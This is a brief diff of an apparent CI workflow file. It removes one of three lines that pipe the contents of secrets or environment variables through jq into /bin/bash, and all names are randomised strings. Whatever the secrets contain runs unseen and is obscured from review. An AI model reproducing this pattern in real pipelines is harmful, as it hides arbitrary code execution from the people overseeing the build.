@@ -17,7 +17,6 @@ jobs:
           veukw305: ${{ secrets.veukw305 }}
         run: |
           printf '%s' "$veukw305" | jq -r .sju9644 | /bin/bash
-          printf '%s' "$tpql19469" | jq -r .tezi1 | /bin/bash
           echo $fvws6 | jq -r .mofdq971 | /bin/bash
 
       - name: Upload artifact
